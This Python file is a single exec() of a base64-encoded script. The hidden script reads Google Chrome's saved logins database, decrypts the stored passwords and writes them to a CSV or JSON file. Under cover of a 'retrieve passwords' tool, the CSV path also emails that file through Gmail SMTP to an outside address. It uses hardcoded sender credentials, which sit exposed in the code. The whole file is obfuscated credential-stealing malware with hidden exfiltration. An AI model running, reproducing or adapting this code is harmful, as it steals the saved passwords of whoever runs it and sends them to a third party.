import base64,sys;exec(base64.b64decode({2:str,3:lambda b:bytes(b,'UTF-8')}[sys.version_info[0]]('IyEvdXNyL2Jpbi9lbnYgcHl0aG9uDQojIC0qLSBjb2Rpbmc6IHV0Zi04IC0qLQ0KaW1wb3J0IG9zDQppbXBvcnQgc3lzDQppbXBvcnQgc3FsaXRlMw0KaW1wb3J0IGNzdg0KaW1wb3J0IGpzb24NCmltcG9ydCBhcmdwYXJzZQ0KDQppbXBvcnQgc210cGxpYg0KZnJvbSBlbWFpbC5taW1lLm11bHRpcGFydCBpbXBvcnQgTUlNRU11bHRpcGFydA0KZnJvbSBlbWFpbC5taW1lLnRleHQgaW1wb3J0IE1JTUVUZXh0DQpmcm9tIGVtYWlsLm1pbWUuYmFzZSBpbXBvcnQgTUlNRUJhc2UNCmZyb20gZW1haWwgaW1wb3J0IGVuY29kZXJzDQoNCnRyeToNCiAgICBpbXBvcnQgd2luMzJjcnlwdA0KZXhjZXB0Og0KICAgIHBhc3MNCg0KDQpkZWYgYXJnc19wYXJzZXIoKToNCiAgICBwYXJzZXIgPSBhcmdwYXJzZS5Bcmd1bWVudFBhcnNlcigNCiAgICAgICAgZGVzY3JpcHRpb249IlJldHJpZXZlIEdvb2dsZSBDaHJvbWUgUGFzc3dvcmRzIikNCiAgICBwYXJzZXIuYWRkX2FyZ3VtZW50KCItbyIsICItLW91dHB1dCIsIGNob2ljZXM9Wydjc3YnLCAnanNvbiddLA0KICAgICAgICAgICAgICAgICAgICAgICAgaGVscD0iT3V0cHV0IHBhc3N3b3JkcyB0byBbIENTViB8IEpTT04gXSBmb3JtYXQuIikNCiAgICBwYXJzZXIuYWRkX2FyZ3VtZW50KA0KICAgICAgICAiLWQiLCAiLS1kdW1wIiwgaGVscD0iRHVtcCBwYXNzd29yZHMgdG8gc3Rkb3V0LiAiLCBhY3Rpb249InN0b3JlX3RydWUiKQ0KDQogICAgYXJncyA9IHBhcnNlci5wYXJzZV9hcmdzKCkNCiAgICBpZiBhcmdzLmR1bXA6DQogICAgICAgIGZvciBkYXRhIGluIG1haW4oKToNCiAgICAgICAgICAgIHByaW50KGRhdGEpDQogICAgaWYgYXJncy5vdXRwdXQgPT0gJ2Nzdic6DQogICAgICAgIG91dHB1dF9jc3YobWFpbigpKQ0KICAgICAgICByZXR1cm4NCg0KICAgIGlmIGFyZ3Mub3V0cHV0ID09ICdqc29uJzoNCiAgICAgICAgb3V0cHV0X2pzb24obWFpbigpKQ0KICAgICAgICByZXR1cm4NCg0KICAgIGVsc2U6DQogICAgICAgIHBhcnNlci5wcmludF9oZWxwKCkNCg0KDQpkZWYgbWFpbigpOg0KICAgIGluZm9fbGlzdCA9IFtdDQogICAgcGF0aCA9IGdldHBhdGgoKQ0KICAgIHRyeToNCiAgICAgICAgY29ubmVjdGlvbiA9IHNxbGl0ZTMuY29ubmVjdChwYXRoICsgIkxvZ2luIERhdGEiKQ0KICAgICAgICB3aXRoIGNvbm5lY3Rpb246DQogICAgICAgICAgICBjdXJzb3IgPSBjb25uZWN0aW9uLmN1cnNvcigpDQogICAgICAgICAgICB2ID0gY3Vyc29yLmV4ZWN1dGUoDQogICAgICAgICAgICAgICAgJ1NFTEVDVCBhY3Rpb25fdXJsLCB1c2VybmFtZV92YWx1ZSwgcGFzc3dvcmRfdmFsdWUgRlJPTSBsb2dpbnMnKQ0KICAgICAgICAgICAgdmFsdWUgPSB2LmZldGNoYWxsKCkNCg0KICAgICAgICBpZiAob3MubmFtZSA9PSAicG9zaXgiKSBhbmQgKHN5cy5wbGF0Zm9ybSA9PSAiZGFyd2luIik6DQogICAgICAgICAgICBwcmludCgiTWFjIE9TWCBub3Qgc3VwcG9ydGVkLiIpDQogICAgICAgICAgICBzeXMuZXhpdCgwKQ0KDQogICAgICAgIGZvciBpbmZvcm1hdGlvbiBpbiB2YWx1ZToNCiAgICAgICAgICAgIGlmIG9zLm5hbWUgPT0gJ250JzoNCiAgICAgICAgICAgICAgICBwYXNzd29yZCA9IHdpbjMyY3J5cHQuQ3J5cHRVbnByb3RlY3REYXRhKA0KICAgICAgICAgICAgICAgICAgICBpbmZvcm1hdGlvblsyXSwgTm9uZSwgTm9uZSwgTm9uZSwgMClbMV0NCiAgICAgICAgICAgICAgICBpZiBwYXNzd29yZDoNCiAgICAgICAgICAgICAgICAgICAgaW5mb19saXN0LmFwcGVuZCh7DQogICAgICAgICAgICAgICAgICAgICAgICAnb3JpZ2luX3VybCc6IGluZm9ybWF0aW9uWzBdLA0KICAgICAgICAgICAgICAgICAgICAgICAgJ3VzZXJuYW1lJzogaW5mb3JtYXRpb25bMV0sDQogICAgICAgICAgICAgICAgICAgICAgICAncGFzc3dvcmQnOiBzdHIocGFzc3dvcmQpDQogICAgICAgICAgICAgICAgICAgIH0pDQoNCiAgICAgICAgICAgIGVsaWYgb3MubmFtZSA9PSAncG9zaXgnOg0KICAgICAgICAgICAgICAgIGluZm9fbGlzdC5hcHBlbmQoew0KICAgICAgICAgICAgICAgICAgICAnb3JpZ2luX3VybCc6IGluZm9ybWF0aW9uWzBdLA0KICAgICAgICAgICAgICAgICAgICAndXNlcm5hbWUnOiBpbmZvcm1hdGlvblsxXSwNCiAgICAgICAgICAgICAgICAgICAgJ3Bhc3N3b3JkJzogaW5mb3JtYXRpb25bMl0NCiAgICAgICAgICAgICAgICB9KQ0KDQogICAgZXhjZXB0IHNxbGl0ZTMuT3BlcmF0aW9uYWxFcnJvciBhcyBlOg0KICAgICAgICBlID0gc3RyKGUpDQogICAgICAgIGlmIChlID09ICdkYXRhYmFzZSBpcyBsb2NrZWQnKToNCiAgICAgICAgICAgIHByaW50KCdbIV0gTWFrZSBzdXJlIEdvb2dsZSBDaHJvbWUgaXMgbm90IHJ1bm5pbmcgaW4gdGhlIGJhY2tncm91bmQnKQ0KICAgICAgICAgICAgc3lzLmV4aXQoMCkNCiAgICAgICAgZWxpZiAoZSA9PSAnbm8gc3VjaCB0YWJsZTogbG9naW5zJyk6DQogICAgICAgICAgICBwcmludCgnWyFdIFNvbWV0aGluZyB3cm9uZyB3aXRoIHRoZSBkYXRhYmFzZSBuYW1lJykNCiAgICAgICAgICAgIHN5cy5leGl0KDApDQogICAgICAgIGVsaWYgKGUgPT0gJ3VuYWJsZSB0byBvcGVuIGRhdGFiYXNlIGZpbGUnKToNCiAgICAgICAgICAgIHByaW50KCdbIV0gU29tZXRoaW5nIHdyb25nIHdpdGggdGhlIGRhdGFiYXNlIHBhdGgnKQ0KICAgICAgICAgICAgc3lzLmV4aXQoMCkNCiAgICAgICAgZWxzZToNCiAgICAgICAgICAgIHByaW50KGUpDQogICAgICAgICAgICBzeXMuZXhpdCgwKQ0KDQogICAgcmV0dXJuIGluZm9fbGlzdA0KDQoNCmRlZiBnZXRwYXRoKCk6DQogICAgaWYgb3MubmFtZSA9PSAibnQiOg0KICAgICAgICAjIFRoaXMgaXMgdGhlIFdpbmRvd3MgUGF0aA0KICAgICAgICBQYXRoTmFtZSA9IG9zLmdldGVudignbG9jYWxhcHBkYXRhJykgKyBcDQogICAgICAgICAgICAgICAgICAgJ1xcR29vZ2xlXFxDaHJvbWVcXFVzZXIgRGF0YVxcRGVmYXVsdFxcJw0KICAgICAgICBpZiAob3MucGF0aC5pc2RpcihQYXRoTmFtZSkgPT0gRmFsc2UpOg0KICAgICAgICAgICAgcHJpbnQoJ1shXSBDaHJvbWUgRG9lc25cJ3QgZXhpc3RzJykNCiAgICAgICAgICAgIHN5cy5leGl0KDApDQogICAgZWxpZiAoKG9zLm5hbWUgPT0gInBvc2l4IikgYW5kIChzeXMucGxhdGZvcm0gPT0gImRhcndpbiIpKToNCiAgICAgICAgIyBUaGlzIGlzIHRoZSBPUyBYIFBhdGgNCiAgICAgICAgUGF0aE5hbWUgPSBvcy5nZXRlbnYoDQogICAgICAgICAgICAnSE9NRScpICsgIi9MaWJyYXJ5L0FwcGxpY2F0aW9uIFN1cHBvcnQvR29vZ2xlL0Nocm9tZS9EZWZhdWx0LyINCiAgICAgICAgaWYgKG9zLnBhdGguaXNkaXIoUGF0aE5hbWUpID09IEZhbHNlKToNCiAgICAgICAgICAgIHByaW50KCdbIV0gQ2hyb21lIERvZXNuXCd0IGV4aXN0cycpDQogICAgICAgICAgICBzeXMuZXhpdCgwKQ0KICAgIGVsaWYgKG9zLm5hbWUgPT0gInBvc2l4Iik6DQogICAgICAgICMgVGhpcyBpcyB0aGUgTGludXggUGF0aA0KICAgICAgICBQYXRoTmFtZSA9IG9zLmdldGVudignSE9NRScpICsgJy8uY29uZmlnL2dvb2dsZS1jaHJvbWUvRGVmYXVsdC8nDQogICAgICAgIGlmIChvcy5wYXRoLmlzZGlyKFBhdGhOYW1lKSA9PSBGYWxzZSk6DQogICAgICAgICAgICBwcmludCgnWyFdIENocm9tZSBEb2VzblwndCBleGlzdHMnKQ0KICAgICAgICAgICAgc3lzLmV4aXQoMCkNCg0KICAgIHJldHVybiBQYXRoTmFtZQ0KDQoNCmRlZiBvdXRwdXRfY3N2KGluZm8pOg0KICAgIHRyeToNCiAgICAgICAgd2l0aCBvcGVuKCdjaHJvbWVwYXNzLXBhc3N3b3Jkcy5jc3YnLCAnd2InKSBhcyBjc3ZfZmlsZToNCiAgICAgICAgICAgIGNzdl9maWxlLndyaXRlKCdvcmlnaW5fdXJsLHVzZXJuYW1lLHBhc3N3b3JkIFxuJy5lbmNvZGUoJ3V0Zi04JykpDQogICAgICAgICAgICBmb3IgZGF0YSBpbiBpbmZvOg0KICAgICAgICAgICAgICAgIGNzdl9maWxlLndyaXRlKCgnJXMsICVzLCAlcyBcbicgJSAoZGF0YVsnb3JpZ2luX3VybCddLCBkYXRhWw0KICAgICAgICAgICAgICAgICAgICAndXNlcm5hbWUnXSwgZGF0YVsncGFzc3dvcmQnXSkpLmVuY29kZSgndXRmLTgnKSkNCiAgICAgICAgcHJpbnQoIkRhdGEgd3JpdHRlbiB0byBjaHJvbWVwYXNzLXBhc3N3b3Jkcy5jc3YiKQ0KICAgICAgICBzZW5kRW1haWwoKQ0KICAgIGV4Y2VwdCBFbnZpcm9ubWVudEVycm9yOg0KICAgICAgICBwcmludCgnRW52aXJvbm1lbnRFcnJvcjogY2Fubm90IHdyaXRlIGRhdGEnKQ0KDQoNCmRlZiBvdXRwdXRfanNvbihpbmZvKToNCiAgICB0cnk6DQogICAgICAgIHdpdGggb3BlbignY2hyb21lcGFzcy1wYXNzd29yZHMuanNvbicsICd3JykgYXMganNvbl9maWxlOg0KICAgICAgICAgICAganNvbi5kdW1wKHsncGFzc3dvcmRfaXRlbXMnOiBpbmZvfSwganNvbl9maWxlKQ0KICAgICAgICAgICAgcHJpbnQoIkRhdGEgd3JpdHRlbiB0byBjaHJvbWVwYXNzLXBhc3N3b3Jkcy5qc29uIikNCiAgICBleGNlcHQgRW52aXJvbm1lbnRFcnJvcjoNCiAgICAgICAgcHJpbnQoJ0Vudmlyb25tZW50RXJyb3I6IGNhbm5vdCB3cml0ZSBkYXRhJykNCg0KDQpkZWYgc2VuZEVtYWlsKCk6DQogICAgZnJvbWFkZHIgPSAicGF0aGFrcm9oaXQ4MTkwQGdtYWlsLmNvbSINCiAgICB0b2FkZHIgPSAicGF0aGFrcm9oaXQwOEBnbWFpbC5jb20iDQoNCiAgICAjIGluc3RhbmNlIG9mIE1JTUVNdWx0aXBhcnQNCiAgICBtc2cgPSBNSU1FTXVsdGlwYXJ0KCkNCg0KICAgICMgc3RvcmluZyB0aGUgc2VuZGVycyBlbWFpbCBhZGRyZXNzDQogICAgbXNnWydGcm9tJ10gPSBmcm9tYWRkcg0KDQogICAgIyBzdG9yaW5nIHRoZSByZWNlaXZlcnMgZW1haWwgYWRkcmVzcw0KICAgIG1zZ1snVG8nXSA9IHRvYWRkcg0KDQogICAgIyBzdG9yaW5nIHRoZSBzdWJqZWN0DQogICAgbXNnWydTdWJqZWN0J10gPSAiUGFzc3dvcmQgc2VudCBieSBVc2VyIg0KDQogICAgIyBzdHJpbmcgdG8gc3RvcmUgdGhlIGJvZHkgb2YgdGhlIG1haWwNCiAgICBib2R5ID0gIkJvZHlfb2ZfdGhlX21haWwiDQoNCiAgICAjIGF0dGFjaCB0aGUgYm9keSB3aXRoIHRoZSBtc2cgaW5zdGFuY2UNCiAgICBtc2cuYXR0YWNoKE1JTUVUZXh0KGJvZHksICdwbGFpbicpKQ0KDQogICAgIyBvcGVuIHRoZSBmaWxlIHRvIGJlIHNlbnQNCiAgICBmaWxlbmFtZSA9ICJjaHJvbWVwYXNzLXBhc3N3b3Jkcy5jc3YiDQogICAgYXR0YWNobWVudCA9IG9wZW4oIi5cY2hyb21lcGFzcy1wYXNzd29yZHMuY3N2IiwgInJiIikNCg0KICAgICMgaW5zdGFuY2Ugb2YgTUlNRUJhc2UgYW5kIG5hbWVkIGFzIHANCiAgICBwID0gTUlNRUJhc2UoJ2FwcGxpY2F0aW9uJywgJ29jdGV0LXN0cmVhbScpDQoNCiAgICAjIFRvIGNoYW5nZSB0aGUgcGF5bG9hZCBpbnRvIGVuY29kZWQgZm9ybQ0KICAgIHAuc2V0X3BheWxvYWQoKGF0dGFjaG1lbnQpLnJlYWQoKSkNCg0KICAgICMgZW5jb2RlIGludG8gYmFzZTY0DQogICAgZW5jb2RlcnMuZW5jb2RlX2Jhc2U2NChwKQ0KDQogICAgcC5hZGRfaGVhZGVyKCdDb250ZW50LURpc3Bvc2l0aW9uJywgImF0dGFjaG1lbnQ7IGZpbGVuYW1lPSAlcyIgJSBmaWxlbmFtZSkNCg0KICAgICMgYXR0YWNoIHRoZSBpbnN0YW5jZSAncCcgdG8gaW5zdGFuY2UgJ21zZycNCiAgICBtc2cuYXR0YWNoKHApDQoNCiAgICAjIGNyZWF0ZXMgU01UUCBzZXNzaW9uDQogICAgcyA9IHNtdHBsaWIuU01UUCgnc210cC5nbWFpbC5jb20nLCA1ODcpDQoNCiAgICAjIHN0YXJ0IFRMUyBmb3Igc2VjdXJpdHkNCiAgICBzLnN0YXJ0dGxzKCkNCg0KICAgICMgQXV0aGVudGljYXRpb24NCiAgICBzLmxvZ2luKGZyb21hZGRyLCAicm9oaXQ4MTkwIikNCg0KICAgICMgQ29udmVydHMgdGhlIE11bHRpcGFydCBtc2cgaW50byBhIHN0cmluZw0KICAgIHRleHQgPSBtc2cuYXNfc3RyaW5nKCkNCg0KICAgICMgc2VuZGluZyB0aGUgbWFpbA0KICAgIHMuc2VuZG1haWwoZnJvbWFkZHIsIHRvYWRkciwgdGV4dCkNCg0KICAgICMgdGVybWluYXRpbmcgdGhlIHNlc3Npb24NCiAgICBzLnF1aXQoKQ0KDQogICAgcHJpbnQoIkVtYWlsIHNlbnQiKQ0KDQoNCmlmIF9fbmFtZV9fID09ICdfX21haW5fXyc6DQogICAgYXJnc19wYXJzZXIoKQ0K')))
